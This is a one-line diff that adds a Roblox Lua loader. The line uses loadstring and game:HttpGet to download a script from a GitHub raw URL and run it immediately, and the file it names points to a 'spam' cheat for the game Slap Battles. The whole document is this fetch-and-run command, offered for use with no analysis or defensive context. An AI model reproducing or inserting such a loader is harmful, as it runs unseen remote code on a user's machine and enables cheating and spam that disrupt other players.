@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/slap-battles-spam0-l1utnldzl4760l.lua"))()
